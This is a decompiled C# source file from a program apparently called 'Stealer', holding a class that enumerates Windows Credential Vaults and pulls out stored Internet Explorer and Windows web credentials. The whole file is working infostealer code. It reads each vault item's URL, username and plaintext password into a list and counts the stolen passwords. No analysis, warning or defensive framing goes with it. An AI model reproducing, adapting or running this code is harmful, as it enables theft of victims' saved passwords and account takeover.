using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Stealer.InternetExplorer
{
	// Token: 0x0200002B RID: 43
	internal sealed class cPasswords
	{
		// Token: 0x060000C4 RID: 196 RVA: 0x00006FA8 File Offset: 0x000051A8
		public static List<Password> Get()
		{
			List<Password> list = new List<Password>();
			Version version = Environment.OSVersion.Version;
			int major = version.Major;
			int minor = version.Minor;
			Type typeFromHandle;
			if (major >= 6 && minor >= 2)
			{
				typeFromHandle = typeof(VaultCli.VAULT_ITEM_WIN8);
			}
			else
			{
				typeFromHandle = typeof(VaultCli.VAULT_ITEM_WIN7);
			}
			int num = 0;
			IntPtr zero = IntPtr.Zero;
			int num2 = VaultCli.VaultEnumerateVaults(0, ref num, ref zero);
			if (num2 != 0)
			{
				throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + num2.ToString() + ")");
			}
			IntPtr ptr = zero;
			Dictionary<Guid, string> dictionary = new Dictionary<Guid, string>();
			dictionary.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
			dictionary.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
			dictionary.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
			dictionary.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
			dictionary.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
			dictionary.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
			dictionary.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
			dictionary.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
			dictionary.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
			for (int i = 0; i < num; i++)
			{
				object obj = Marshal.PtrToStructure(ptr, typeof(Guid));
				Guid key = new Guid(obj.ToString());
				ptr = (IntPtr)(ptr.ToInt64() + (long)Marshal.SizeOf(typeof(Guid)));
				IntPtr zero2 = IntPtr.Zero;
				string str;
				if (dictionary.ContainsKey(key))
				{
					str = dictionary[key];
				}
				else
				{
					str = key.ToString();
				}
				num2 = VaultCli.VaultOpenVault(ref key, 0U, ref zero2);
				if (num2 != 0)
				{
					Console.WriteLine("Unable to open the following vault: " + str + ". Error: 0x" + num2.ToString());
				}
				else
				{
					int num3 = 0;
					IntPtr zero3 = IntPtr.Zero;
					num2 = VaultCli.VaultEnumerateItems(zero2, 512, ref num3, ref zero3);
					if (num2 != 0)
					{
						Console.WriteLine("[ERROR] Unable to enumerate vault items from the following vault: " + str + ". Error 0x" + num2.ToString());
					}
					else
					{
						IntPtr ptr2 = zero3;
						if (num3 > 0)
						{
							for (int j = 1; j <= num3; j++)
							{
								object obj2 = Marshal.PtrToStructure(ptr2, typeFromHandle);
								ptr2 = (IntPtr)(ptr2.ToInt64() + (long)Marshal.SizeOf(typeFromHandle));
								IntPtr zero4 = IntPtr.Zero;
								FieldInfo field = obj2.GetType().GetField("SchemaId");
								Guid guid = new Guid(field.GetValue(obj2).ToString());
								IntPtr intPtr = (IntPtr)obj2.GetType().GetField("pResourceElement").GetValue(obj2);
								IntPtr intPtr2 = (IntPtr)obj2.GetType().GetField("pIdentityElement").GetValue(obj2);
								IntPtr pPackageSid = IntPtr.Zero;
								if (major >= 6 && minor >= 2)
								{
									pPackageSid = (IntPtr)obj2.GetType().GetField("pPackageSid").GetValue(obj2);
									num2 = VaultCli.VaultGetItem_WIN8(zero2, ref guid, intPtr, intPtr2, pPackageSid, IntPtr.Zero, 0, ref zero4);
								}
								else
								{
									num2 = VaultCli.VaultGetItem_WIN7(zero2, ref guid, intPtr, intPtr2, IntPtr.Zero, 0, ref zero4);
								}
								if (num2 != 0)
								{
									Console.WriteLine("Error occured while retrieving vault item. Error: 0x" + num2.ToString());
								}
								else
								{
									object obj3 = Marshal.PtrToStructure(zero4, typeFromHandle);
									IntPtr vaultElementPtr = (IntPtr)obj3.GetType().GetField("pAuthenticatorElement").GetValue(obj3);
									Password item = default(Password);
									object obj4 = cPasswords.<Get>g__GetVaultElementValue|0_0(intPtr);
									if (obj4 != null)
									{
										item.sUrl = obj4.ToString();
									}
									object obj5 = cPasswords.<Get>g__GetVaultElementValue|0_0(intPtr2);
									if (obj5 != null)
									{
										item.sUsername = obj5.ToString();
									}
									object obj6 = cPasswords.<Get>g__GetVaultElementValue|0_0(vaultElementPtr);
									if (obj6 != null)
									{
										item.sPassword = obj6.ToString();
									}
									Counter.Passwords++;
									list.Add(item);
								}
							}
						}
					}
				}
			}
			return list;
		}

		// Token: 0x060000C6 RID: 198 RVA: 0x000073B8 File Offset: 0x000055B8
		[CompilerGenerated]
		internal static object <Get>g__GetVaultElementValue|0_0(IntPtr vaultElementPtr)
		{
			object obj = Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
			object value = obj.GetType().GetField("Type").GetValue(obj);
			IntPtr ptr = (IntPtr)(vaultElementPtr.ToInt64() + 16L);
			switch ((int)value)
			{
			case 0:
			{
				object obj2 = Marshal.ReadByte(ptr);
				return (bool)obj2;
			}
			case 1:
				return Marshal.ReadInt16(ptr);
			case 2:
				return Marshal.ReadInt16(ptr);
			case 3:
				return Marshal.ReadInt32(ptr);
			case 4:
				return Marshal.ReadInt32(ptr);
			case 5:
				return Marshal.PtrToStructure(ptr, typeof(double));
			case 6:
				return Marshal.PtrToStructure(ptr, typeof(Guid));
			case 7:
				return Marshal.PtrToStringUni(Marshal.ReadIntPtr(ptr));
			case 12:
				return new SecurityIdentifier(Marshal.ReadIntPtr(ptr)).Value;
			}
			return null;
		}
	}
}
